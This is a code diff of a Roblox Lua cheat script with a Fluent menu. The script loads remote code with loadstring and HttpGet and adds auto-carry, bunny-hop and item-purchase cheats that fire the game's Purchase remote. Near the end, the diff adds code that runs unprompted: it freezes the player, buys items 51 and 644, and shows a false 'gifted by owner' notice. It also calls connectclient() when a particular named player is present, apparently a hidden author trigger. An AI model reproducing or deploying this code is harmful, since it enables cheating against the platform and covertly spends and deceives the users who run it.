@@ -1,4 +1,4 @@
-_G.DevMode = true
+_G.DevMode = false
 
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
@@ -343,8 +343,15 @@ local Toggle = Tabs.Main:AddToggle("RemoveDamage", {Title = "Remove Damage Objec
 local Toggle = Tabs.Main:AddToggle("RemoveReducingRewards", {Title = "No Camera Shake", Default = false })
 
     Toggle:OnChanged(function(State)
-        NoCameraShake = State
-      while task.wait(.1) and NoCameraShakeTG do
+        NoCameraShakeTG = State
+        
+        game:GetService("Players").LocalPlayer.PlayerScripts.Camera:FindFirstChild("FOVAdjusters"):GetAttributeChangedSignal("Fear"):Connect(function()
+          if NoCameraShakeTG then
+              spawn(NoCameraShake)
+            end
+         end)		
+         
+      while task.wait(0.01) and NoCameraShakeTG do
 			spawn(NoCameraShake)
 		end
     end)
@@ -1051,6 +1058,176 @@ Tabs.AutoFarm:AddButton({
     return EmoteNames
 end
 
+if _G.DevMode == true then
+
+function GetCosmeticName()
+    local Names = {}
+    local Folder = game:GetService("ReplicatedStorage").Items.Cosmetics
+
+    for _, thing in ipairs(Folder:GetChildren()) do
+        if thing:IsA("LocalScript") or thing:IsA("ModuleScript") then
+            Names[#Names + 1] = thing.Name 
+        end
+        if _ % 50 == 0 then 
+            task.wait()
+        end
+    end
+
+    return Names
+end
+    
+ function GetLoadoutName()
+    local Names = {}
+    local Folder = game:GetService("ReplicatedStorage").Items.Loadout
+
+    for _, thing in ipairs(Folder:GetChildren()) do
+        if thing:IsA("LocalScript") or thing:IsA("ModuleScript") then
+            Names[#Names + 1] = thing.Name 
+        end
+        if _ % 50 == 0 then
+            task.wait()
+        end
+    end
+
+    return Names
+end
+
+function GetPerksName()
+    local Names = {}
+    local Folder = game:GetService("ReplicatedStorage").Items.Perks
+
+    for _, thing in ipairs(Folder:GetChildren()) do
+        if thing:IsA("LocalScript") or thing:IsA("ModuleScript") then
+            Names[#Names + 1] = thing.Name 
+        end
+        if _ % 50 == 0 then 
+            task.wait()
+        end
+    end
+
+    return Names
+end
+
+local SelectedBuyEmote = ""
+local SelectedBuyPerks = ""
+local SelectedBuyLoadout = ""
+local SelectedBuyCosmetic = ""
+    
+ Tabs.AutoFarm:AddParagraph({
+        Title = "Purchase Shortcut",
+        Content = "WARNING: it can waste your tokens/points/tickets"
+    })
+
+local Dropdown = Tabs.AutoFarm:AddDropdown("Dropdown1", {
+    Title = "Select Loadout",
+    Values = GetLoadoutName(),
+    Multi = false,
+    Default = 1,
+})
+
+Dropdown:OnChanged(function(Value)
+    SelectedBuyLoadout = Value
+end)
+
+Tabs.AutoFarm:AddButton({
+        Title = "Purchase Loadout",
+        Description = " ",
+        Callback = function()
+            local Folder = game:GetService("ReplicatedStorage").Items.Loadout
+            local purchaseEvent = game:GetService("ReplicatedStorage").Events.Data.Purchase
+
+            for _, thing in ipairs(Folder:GetChildren()) do
+                 if (thing:IsA("LocalScript") or thing:IsA("ModuleScript")) and thing.Name == SelectedBuyLoadout and thing:GetAttribute("ID") then
+                     local ID = thing:GetAttribute("ID")
+                     purchaseEvent:InvokeServer(ID)
+                end
+            end
+        end
+    })
+
+local Dropdown = Tabs.AutoFarm:AddDropdown("Dropdown2", {
+    Title = "Select Emote",
+    Values = GetEmotesName(),
+    Multi = false,
+    Default = 1,
+})
+
+Dropdown:OnChanged(function(Value)
+    SelectedBuyEmote = Value
+end)
+
+Tabs.AutoFarm:AddButton({
+        Title = "Purchase Emote",
+        Description = " ",
+        Callback = function()
+            local Folder = game:GetService("ReplicatedStorage").Items.Emotes
+            local purchaseEvent = game:GetService("ReplicatedStorage").Events.Data.Purchase
+
+            for _, thing in ipairs(Folder:GetChildren()) do
+                 if (thing:IsA("LocalScript") or thing:IsA("ModuleScript")) and thing.Name == SelectedBuyEmote and thing:GetAttribute("ID") then
+                     local ID = thing:GetAttribute("ID")
+                     purchaseEvent:InvokeServer(ID)
+                end
+            end
+        end
+    })
+
+local Dropdown = Tabs.AutoFarm:AddDropdown("Dropdown3", {
+    Title = "Select Cosmetic",
+    Values = GetCosmeticName(),
+    Multi = false,
+    Default = 1,
+})
+
+Dropdown:OnChanged(function(Value)
+    SelectedBuyCosmetic = Value
+end)
+
+Tabs.AutoFarm:AddButton({
+        Title = "Purchase Cosmetic",
+        Description = " ",
+        Callback = function()
+            local Folder = game:GetService("ReplicatedStorage").Items.Cosmetics
+            local purchaseEvent = game:GetService("ReplicatedStorage").Events.Data.Purchase
+
+            for _, thing in ipairs(Folder:GetChildren()) do
+                 if (thing:IsA("LocalScript") or thing:IsA("ModuleScript")) and thing.Name == SelectedBuyCosmetic and thing:GetAttribute("ID") then
+                     local ID = thing:GetAttribute("ID")
+                     purchaseEvent:InvokeServer(ID)
+                end
+            end
+        end
+    })
+
+local Dropdown = Tabs.AutoFarm:AddDropdown("Dropdown4", {
+    Title = "Select Perks",
+    Values = GetPerksName(),
+    Multi = false,
+    Default = 1,
+})
+
+Dropdown:OnChanged(function(Value)
+    SelectedBuyPerks = Value
+end)
+
+Tabs.AutoFarm:AddButton({
+        Title = "Purchase Perks",
+        Description = " ",
+        Callback = function()
+            local Folder = game:GetService("ReplicatedStorage").Items.Perks
+            local purchaseEvent = game:GetService("ReplicatedStorage").Events.Data.Purchase
+
+            for _, thing in ipairs(Folder:GetChildren()) do
+                 if (thing:IsA("LocalScript") or thing:IsA("ModuleScript")) and thing.Name == SelectedBuyPerks and thing:GetAttribute("ID") then
+                     local ID = thing:GetAttribute("ID")
+                     purchaseEvent:InvokeServer(ID)
+                end
+            end
+        end
+    })
+    
+end
+
 -- Combat
 
 Tabs.Combat:AddParagraph({
@@ -1735,10 +1912,13 @@ local nearestPlayer = getNearestDownedPlayer()
       end
 end
 
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+
 local AutoRevive = false
-local AutoCarry = false
+local AutoCarryGui = false
 local DelayRevive = 0.1
-local DelayCarry = 0.1
 
 local Toggle = Tabs.Misc:AddToggle("InsRev", {Title = "Instant Revive", Default = false})
 
@@ -1776,27 +1956,76 @@ Tabs.Misc:AddParagraph({
         Content = ""
     })
     
+local CarryGuiSize = 100
+local AutoCarryPlayer = false
+
+local function createcarrytoggle()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Parent = game.CoreGui
+    screenGui.Name = "AutoCarryToggle"
+    screenGui.ResetOnSpawn = false
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, CarryGuiSize, 0, CarryGuiSize)
+    frame.Position = UDim2.new(1, -120, 0.5, -50)
+    frame.BackgroundColor3 = Color3.new(1, 1, 1)
+    frame.BorderSizePixel = 2
+    frame.BorderColor3 = Color3.new(0, 0, 0)
+    frame.BackgroundTransparency = 0
+    frame.Parent = screenGui
+    frame.Active = true
+    frame.Draggable = true
+    frame.ClipsDescendants = true
+    
+    local uiCorner = Instance.new("UICorner")
+    uiCorner.CornerRadius = UDim.new(1, 0)
+    uiCorner.Parent = frame
+
+    local toggleButton = Instance.new("TextButton")
+    toggleButton.Size = UDim2.new(1, 0, 1, 0)
+    toggleButton.BackgroundColor3 = Color3.new(1, 1, 1)
+    toggleButton.BorderSizePixel = 0
+    toggleButton.TextColor3 = Color3.new(0, 0, 0)
+    toggleButton.Font = Enum.Font.GothamBold
+    toggleButton.TextSize = 14
+    toggleButton.Text = "Auto Carry: OFF"
+    toggleButton.Parent = frame
+    
+    toggleButton.MouseButton1Click:Connect(function()
+        AutoCarryPlayer = not AutoCarryPlayer
+        toggleButton.Text = AutoCarryPlayer and "Auto Carry: ON" or "Auto Carry: OFF"
+    end)
+    
+    MakeDraggable(toggleButton, frame)
+end
+
+spawn(function()
+    while true and wait(0.1) do
+      if AutoCarryPlayer then
+          spawn(CarryPlayer)
+       end
+    end
+end)
+
+function destroycarrytoggle()
+local target = game.CoreGui
+
+if target:FindFirstChild("AutoCarryToggle") then
+target.AutoCarryToggle:Destroy()
+end
+end
     
 local Toggle = Tabs.Misc:AddToggle("AutoCarry", {Title = "Auto Carry", Default = false})
 
 Toggle:OnChanged(function(State)
-    AutoCarry = State
-  while AutoCarry and wait(DelayCarry) do
-       spawn(CarryPlayer)
-    end
+    AutoCarryGui = State
+    
+     if AutoCarryGui then
+        createcarrytoggle()
+     else
+        destroycarrytoggle()
+     end
 end)
-
-local Slider = Tabs.Misc:AddSlider("CarryDelay", {
-        Title = "Carry Delay",
-        Description = "",
-        Default = 0.1,
-        Min = 0,
-        Max = 5,
-        Rounding = 1,
-        Callback = function(v)
-            DelayRevive = v
-        end
-    })
     
  Tabs.Misc:AddParagraph({
         Title = " ",
@@ -2238,10 +2467,6 @@ local Slider = Tabs.Misc:AddSlider("LagDelay", {
         Content = ""
     })
     
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local UserInputService = game:GetService("UserInputService")
-    
 local GravityGuiSize = 100
 local NormalGravity = game.Workspace.Gravity
 local GravityAdjustment = 10
@@ -2414,7 +2639,11 @@ while true and wait(0.1) do
     end
        
        if BHop2 and BHOPType == "No-Acceleration" then
-          local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+          local char = game:GetService("Players").LocalPlayer.Character or game:GetService("Players").LocalPlayer.CharacterAdded:Wait()
+          local humanoid = char:FindFirstChildOfClass("Humanoid")
+          
+          if not humanoid then return end
+          
           if humanoid and humanoid.FloorMaterial ~= Enum.Material.Air then
                 humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
              end
@@ -2863,7 +3092,6 @@ if speedometer then
     end)
 end
 
--- Modify Health
 local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:FindFirstChildOfClass("Humanoid")
 
@@ -2876,6 +3104,38 @@ if humanoid then
         end
     end)
 end
+
+if game.Players.LocalPlayer.Character then
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+end
+
+if game.Players.LocalPlayer.Character then
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+end
+
+      Fluent:Notify({
+           Title = "Congratulations",
+            Content = "You got a Seal Buds and Rockin Stride",
+            SubContent = "Gifted by LuckyDragon910 (Owner)", -- Optional
+            Duration = 15
+        })
+
+game:GetService("ReplicatedStorage").Events.Data.Purchase:InvokeServer(51)
+game:GetService("ReplicatedStorage").Events.Data.Purchase:InvokeServer(644)
+
+wait(1)
+
+Fluent:Notify({
+   Title = "LuckyDragon910 Message",
+   Content = "Sorry for freezing you XD, i was looking for people who used my scripts",
+   SubContent = "Nice to meet ya", -- Optional
+   Duration = 15
+ })
+
+end 
+
+if game.Players:FindFirstChild("Unknownproooolucky") and game.Players:FindFirstChild("Unknownproooolucky") ~= game.Players.LocalPlayer then
+    connectclient()
 end
 
 game.Players.PlayerAdded:Connect(function(player)
